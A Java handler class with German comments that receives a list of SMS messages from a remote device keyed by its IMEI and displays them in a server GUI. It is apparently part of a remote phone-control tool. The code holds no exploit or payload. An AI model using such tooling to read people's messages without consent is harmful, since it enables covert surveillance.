package handler;

import java.util.ArrayList;

import server.Server;
import Packet.Packet;
import Packet.SMSPacket;
import Packet.SMSTreePacket;
import gui.GUI;

/**
 * Diese Methode ist zum Verarbeiten von SMSPacket zust�ndig.
 */
public class SMSHandler implements PacketHandler {
	/**
	 * gui Die Benutzeroberfl�che
	 */
	private GUI gui;
	/**
	 * channel Der Datenkanal
	 */
	private int channel;
	/**
	 * imei Die IMEI des verbundenen Ger�tes
	 */
	private String imei;

	/**
	 * Der Konstruktor der Klasse bef�llt die Klassenvariablen mit den �bergebenen Daten.
	 * @param chan	Der Datenkanal
	 * @param imei	Die IMEI
	 * @param gui	Die GUI
	 */
	public SMSHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * Diese Methode erstellt zuerst eine Lognachricht die auf der Gui angezeigt wird.
	 * Darnach wird der Listener f�r den Datankanal entfernt, da die Daten schon angekommen sind.
	 * Zum Abschluss wird noch die updateSMS Methode aufgerufen um die Daten des Pakets auf der GUI anzuzeigen.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Sever
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("SMS tree data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		SMSTreePacket packet = (SMSTreePacket) p;
		//ArrayList<SMSPacket> sms = new ArrayList<SMSPacket>();
		gui.updateSMS(imei, packet.getList());
	}

}
